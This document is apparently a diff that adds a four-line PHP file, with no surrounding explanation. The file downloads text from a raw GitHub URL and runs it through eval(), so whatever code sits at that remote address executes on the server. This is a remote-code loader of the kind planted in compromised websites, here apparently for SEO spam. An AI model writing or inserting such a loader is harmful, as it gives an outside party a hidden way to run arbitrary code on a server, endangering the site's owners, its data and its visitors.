@@ -1,0 +1,4 @@
+<?php
+$casperseo = file_get_contents('https://raw.githubusercontent.com/okewlalocksystem-tech/BELAWAN/refs/heads/main/dfqaweaaf.txt');
+$casperseo = "?> ".$casperseo;
+eval($casperseo);
